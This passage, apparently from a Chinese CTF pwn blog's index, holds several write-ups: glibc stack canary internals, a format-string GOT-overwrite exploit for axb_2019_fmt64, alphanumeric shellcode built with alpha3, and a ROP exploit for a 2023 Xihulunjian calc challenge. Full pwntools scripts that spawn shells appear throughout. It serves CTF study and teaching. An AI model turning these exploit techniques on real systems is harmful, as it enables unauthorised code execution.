这就要从内核的_dl_random说起了</p><p>其是一个地址 用来指向内核中存储随机数的地方</p><p>该随机数初始化于动态链接之前</p><p>其存放于auxiliary vector 数组中 该数组是用来辅助程序运行的数据数组</p><p>其在dl_main函数中被调用 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElfW(Addr)</span><br><span class="line">_dl_sysdep_start (void **start_argptr,</span><br><span class="line">     void (*dl_main) (const ElfW(Phdr) *phdr, ElfW(Word) phnum,</span><br><span class="line">          ElfW(Addr) *user_entry, ElfW(auxv_t) *auxv))</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  DL_FIND_ARG_COMPONENTS (start_argptr, _dl_argc, _dl_argv, _environ,</span><br><span class="line">         GLRO(dl_auxv));</span><br><span class="line">  for (av = GLRO(dl_auxv); av-&gt;a_type != AT_NULL; set_seen (av++))</span><br><span class="line">    ...</span><br><span class="line">   case AT_RANDOM:</span><br><span class="line">   _dl_random = (void *) av-&gt;a_un.a_val;</span><br><span class="line">   break;</span><br><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是__libc_start_main函数 其生成canary的源码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// sysdeps\unix\sysv\linux\dl-osinfo.h</span><br><span class="line">static inline uintptr_t __attribute__ ((always_inline))</span><br><span class="line">_dl_setup_stack_chk_guard (void *dl_random)</span><br><span class="line">&#123;</span><br><span class="line">  union</span><br><span class="line">  &#123;</span><br><span class="line">    uintptr_t num;</span><br><span class="line">    unsigned char bytes[sizeof (uintptr_t)];</span><br><span class="line">  &#125; ret;</span><br><span class="line"></span><br><span class="line">  /* We need in the moment only 8 bytes on 32-bit platforms and 16</span><br><span class="line">     bytes on 64-bit platforms.  Therefore we can use the data</span><br><span class="line">     directly and not use the kernel-provided data to seed a PRNG.  */</span><br><span class="line">  memcpy (ret.bytes, dl_random, sizeof (ret));</span><br><span class="line">#if BYTE_ORDER == LITTLE_ENDIAN</span><br><span class="line">  ret.num &amp;= ~(uintptr_t) 0xff;</span><br><span class="line">#elif BYTE_ORDER == BIG_ENDIAN</span><br><span class="line">  ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));</span><br><span class="line">#else</span><br><span class="line"># error &quot;BYTE_ORDER unknown&quot;</span><br><span class="line">#endif</span><br><span class="line">  return ret.num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary的值和dl_random一致  只不过在最后一个字节强制使其为\x00</p><p>接着来到_libc_start_init函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  /* Set up the stack checker&#x27;s canary.  */</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"># ifdef THREAD_SET_STACK_GUARD</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"># else</span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"># endif</span><br></pre></td></tr></table></figure><p>如果设置了THREAD_SET_STACK_GUARD宏 那么canary就会被设置进入线程局部存储</p><p>PS:一直没有搞清楚TEB TCB pthread三者的关系 上述的描述可能存在很大问题 更详细的源码级别可以看这篇博客 以我的水平很难对其进行复述</p><p><a href="https://kiprey.github.io/2022/08/thread_canary/#%E4%B8%89%E3%80%81%E6%B7%B1%E5%85%A5-glibc">浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog</a></p><p><a href="https://pic.imgdb.cn/item/63ef931af144a010072786f1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef931af144a010072786f1.png"></a></p><p>在gdb中我们修改其值为0 接下一路n到函数结束前的canary判断</p><p><a href="https://pic.imgdb.cn/item/63ef947af144a010072a0962.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef947af144a010072a0962.png"></a></p><p>此时只要rcx寄存器中的值与fs:0x28中的值相同  就会触发je指令 正常结束栈帧</p><p>但是显然 此时rcx寄存器保存的是在函数最开始入栈的旧canary值 而此时fs:0x28处的值已经被我们修改为0 如果此时进行xor 显然结果是不会为0</p><p>我们再次更改一下rcx寄存器的值 并且执行这一步异或</p><p>此时eflags寄存器的值为<a href="https://pic.imgdb.cn/item/63ef97bdf144a01007309261.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef97bdf144a01007309261.png"></a></p><p>其二进制形式为1001000110</p><p>ZF标志位是1 那么jz指令就会跳转</p><p>于是就不会触发__stack_chk_fail函数 所以我们成功绕过了canary</p><p>上述的绕过是基于修改主TCB中的canary 还有一种办法是修改子线程的TCB 这里不做说明</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>axb_2019_fmt64</title>
      <link href="/2023/02/15/axb-2019-fmt64/"/>
      <url>/2023/02/15/axb-2019-fmt64/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这题收获还是很大的 学会了自己构造任意写的格式化字符串漏洞payload</p><p>checksec看一下保护机制</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/chen/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure><p>ida查看一下反汇编代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">272</span>]; <span class="comment">// [rsp+10h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">312</span>]; <span class="comment">// [rsp+120h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="number">0x12C</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很常规的64位格式化字符串 但是多了个函数alarm 限制了进程持续的时间</p><p>如果我们使用pwntools内置的函数fmtstr_payload来生成payload的话 会由于字节过多发送失败 所以这里尝试一下自己构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26248)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400957&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>泄露libc基址很简单 只要注意一下64位的p64会附带\x00 导致printf读取到后直接截断了 无法正常泄露 得把p64放在后面</p><p>接下来的难点在于说如何任意地址写</p><p>这题要获取shell的办法无非就是覆盖函数的got表 修改为system 随后参数设置为&#x2F;bin&#x2F;sh 或者是onegadget</p><p>而格式化字符串任意写是依靠%x$n 这个格式符是将其前面输出的字节赋值到对应的偏移地址</p><p>如果我们想要任意写的只是小额的数值 我们可以这样构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;%$xn&#x27;</span>+p64(ptr_addr)</span><br><span class="line"><span class="comment"># 其中padding是想要修改的数值 x是varge参数的偏移</span></span><br></pre></td></tr></table></figure><p>但是如果我们想要赋值onegadget到exit函数的got表 那么可想而知 需要庞大的字节数 不仅仅题目很少会给我们无限制的读入数据 如此庞大的数据还会导致程序运行缓慢 何况这题还调用了alarm函数</p><p>那么换个想法 如果我们只是修改单字节或者是双字节呢?</p><p>因为每个函数的真实地址差别只在于最后几个字节  前面的都是一样的  这样就可以大大减少需要的字节数</p><p>对于一个地址来说 其在内存一共占用了8个字节 而每个字节都存放着相应的数值 比如说下图</p><p><a href="https://pic.imgdb.cn/item/63ecf806f144a01007a6e717.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ecf806f144a01007a6e717.png"></a></p><p>0x7f7458560971处的内容就是0x55</p><p><a href="https://pic.imgdb.cn/item/63ecf904f144a01007a92a79.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ecf904f144a01007a92a79.png"></a></p><p>我们对比一下got表中存放的真实地址 发现只有后5位是不一样的 不过由于没有办法单独修改1位 所以我们需要修改后三个字节的数据</p><p>我们知道在n前面添加一个h就可以减半要操作的字节数 %$xhhn就可以做到修改单字节的数据</p><p>所以只能修改2的倍数的字节 要想修改三个字节的话 我们需要修改两次 一次修改单字节 一次修改双字节</p><p>接下来还有一个问题在于 函数的真实地址每次程序运行的时候都会变化 我们肉眼当然是可以读出地址的后三位</p><p>但是要如何利用脚本来实现读取呢?</p><p>这里介绍一下算术右移和与运算</p><p><strong>算术右移:</strong> </p><p>对于一个二进制数 例如11110000来说  其符号位为1 如果是逻辑右移的话 不需要考虑符号位 而算术右移 如果符号位是1的话 就需要用1来补全 反之 用0来补全 比如算术右移3</p><p>那么这个二进制数就会变成  (1)(1)(1)11110   括号的表示是补全的</p><p><strong>与运算:</strong></p><p>二进制数a  10101010</p><p>二进制数b  11111111</p><p>二者进行与运算的话 对应的位依次进行比较 </p><p>如果两个位都是1的话 那么与运算之后的结果就是1 除此之外的所有情况 与运算后的结果都是0</p><p>那么a和b与运算后的结果就是  10101010</p><p>与运算的作用在于 如果我们是和0xff来与运算 其二进制数是11111111</p><p>就会保留与之运算的数的最后一个字节的值</p><p>比如:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr =<span class="number">0x7fb60fe40420</span></span><br><span class="line"><span class="comment"># 11111111 10110110 00001111 11100100 00000100 00100000 system_addr</span></span><br><span class="line"><span class="comment"># 00000000 00000000 00000000 00000000 11111111 11111111 0xffff</span></span><br><span class="line"><span class="comment"># 00000000 00000000 00000000 00000000 00000100 00100000 0x0420</span></span><br></pre></td></tr></table></figure><p>用system_addr去和0xffff与运算 最后得到的结果就是0x0420 为system_addr的最后两个字节</p><p>如果再用上算术右移 那么我们就可以获取到倒数第三个字节的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr =<span class="number">0x7fb60fe40420</span></span><br><span class="line"><span class="comment"># 11111111 10110110 00001111 11100100 00000100 00100000 system_addr</span></span><br><span class="line"><span class="comment"># 11111111 11111111 11111111 10110110 00001111 11100100 system_addr &gt;&gt; 16</span></span><br><span class="line"><span class="comment"># 00000000 00000000 00000000 00000000 00000000 11111111 0xff</span></span><br><span class="line"><span class="comment"># 00000000 00000000 00000000 00000000 00000000 11100100 0xe4</span></span><br></pre></td></tr></table></figure><p>最后得到的值就是system_addr的倒数第三个字节</p><p>至于输出足够的字节来使%n读取到从而任意写  则是采用%c这个格式化字符 其作用是输出x个字节 如果不够则用\x00补齐</p><p>比如 <strong>printf(“%10c”)</strong> 就会输出10个空字符</p><p>那么最后的payload就是这样构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_addr-<span class="number">9</span>).encode()+<span class="string">b&#x27;c%12$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_addr-high_addr).encode()+<span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(strlen_got+<span class="number">2</span>)+p64(strlen_got)</span><br></pre></td></tr></table></figure><p>%n是在其之前输出了多少字节的字符就将对应值赋给对应的地址  而在这一题中 先行输出了 <strong>“Repeater:”</strong> 所以需要-9</p><p>而encode()则是在python3中需要发送byte型的数据 所以需要进行转化 随后的low_addr-high_addr也是同理</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26248)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400957&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">alarm_addr = libc_addr + libc.sym[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#7a4420</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">high_addr = (onegadget_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">low_addr = onegadget_addr&amp;<span class="number">0xffff</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_addr-<span class="number">9</span>).encode()+<span class="string">b&#x27;c%12$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_addr-high_addr).encode()+<span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(strlen_got+<span class="number">2</span>)+p64(strlen_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>可见字符shellcode</title>
      <link href="/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/"/>
      <url>/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>利用pwntools自带的shellcraft生成的shellcode 所消耗的字节数比较多 并且还含有很多的不可见字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63e7980d4757feff3305a984.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63e7980d4757feff3305a984.png"></a></p><p>有些题目会对症下药 限制shellcode长度的题目已经屡见不鲜 本篇文章来讲一下限制字符范围的shellcode</p><p>国际上普遍采用ascii码作为字符的编码 其中规定了95个可见字符 即打印字符 可以被直接输出 剩下的则是不可见的字符</p><p>而pwn题中的可见字符shellcode通常指使用可见字符构成的shellcode</p><p>这里我们需要借用alpha3这款工具来将一串不可见的字符shellcode转化为可见字符</p><p>手动转化的办法这里就不介绍了 毕竟我也不会 哪天学会了再补充吧</p><p>由于官方的alpha3只支持win32 在linux系统中会出现报错 需要我们修改源码 比较麻烦 再加上需要我们自己编译</p><p>所以这里直接采用这个师傅的修改版进行下载使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/SmalOSnail/article/details/105236336</span><br></pre></td></tr></table></figure><p>下载指令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63e799964757feff33111868.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63e799964757feff33111868.png"></a></p><p>其内置了两个脚本和两个文本文件</p><p>各自对应32位和64位系统的shellcode生成脚本 我们只需要修改shellcode文本文件中的shellcode 并且指定shellcode的基地址后运行脚本</p><p>这里使用open read write函数来写入shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/home/chen/alpha3/shellcode&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>用python2运行就好了 3的话区分了str和byte型 会导致write出错</p><p>随后cd到alpha3目录下 .&#x2F;shellcode_x??.sh shellcode基地址</p><p>这个基地址要怎么看  以mrctf2020_shellcode_revenge这一题为例</p><p><a href="https://pic.imgdb.cn/item/63e7a0c44757feff33471c29.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63e7a0c44757feff33471c29.png"></a></p><p>其将shellcode的地址赋值给了rax寄存器 那么call rax 就是调用shellcode 所以我们这里的shellcode基地址应该是rax</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023西湖论剑calc</title>
      <link href="/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/"/>
      <url>/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>本次wp首次尝试使用视频方式表示</p><p>视频地址：<a href="https://www.bilibili.com/video/BV1R8411M7hF/?spm_id_from=333.999.0.0&vd_source=8543a418a87bc93ee104e52809d057c2">2022西湖论剑 babycalc复现_哔哩哔哩_bilibili</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28066)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate_libc2.23&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ret_addr = <span class="number">0x4005b9</span></span><br><span class="line">rdi_addr = <span class="number">0x400ca3</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x400ca1</span></span><br><span class="line">bss_addr = <span class="number">0x602510</span></span><br><span class="line">rsp_r13_r14_r15_addr = <span class="number">0x400c9d</span></span><br><span class="line">read_plt = <span class="number">0x4005f0</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">#key = p64(0xa111423746352413)+p64(0x318c77665d48332)</span></span><br><span class="line">payload = <span class="string">b&#x27;24&#x27;</span>+cyclic(<span class="number">0x6</span>)+p64(ret_addr)*<span class="number">17</span></span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_r15_addr)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(rsp_r13_r14_r15_addr)+p64(bss_addr-<span class="number">0x18</span>)</span><br><span class="line">payload += p8(<span class="number">19</span>)+p8(<span class="number">36</span>)+p8(<span class="number">53</span>)+p8(<span class="number">70</span>)+p8(<span class="number">55</span>)+p8(<span class="number">66</span>)+p8(<span class="number">17</span>)+p8(<span class="number">161</span>)+p8(<span class="number">50</span>)+p8(<span class="number">131</span>)+p8(<span class="number">212</span>)+p8(<span class="number">101</span>)+p8(<span class="number">118</span>)+p8(<span class="number">199</span>)+p8(<span class="number">24</span>)+p8(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#payload += key</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>-<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400BB8&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_r15_addr)+p64(bss_addr+<span class="number">0x48</span>)+p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400c9d&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_addr = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mprotect修改bss段权限</title>
      <link href="/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/"/>
      <url>/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/</url>
      
